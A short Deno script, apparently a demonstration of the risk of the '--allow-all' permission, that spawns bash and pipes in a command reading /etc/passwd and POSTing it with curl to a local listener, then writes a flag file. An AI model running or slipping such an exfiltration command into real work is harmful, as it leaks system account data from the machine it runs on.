// This runs in parallel with `host.ts`.

const p = Deno.run({
  cmd: ["bash"],
  stdout: "piped",
  stdin: "piped"
});

const encoder = new TextEncoder();
const decoder = new TextDecoder();

const command = "cat /etc/passwd | curl -X POST -d @- http://localhost:8000/ && echo 'Demonstration of --allow-all' > flag.txt";
await p.stdin.write(encoder.encode(command));
p.stdin.close();

const output = await p.output()
p.close();

console.log(decoder.decode(output));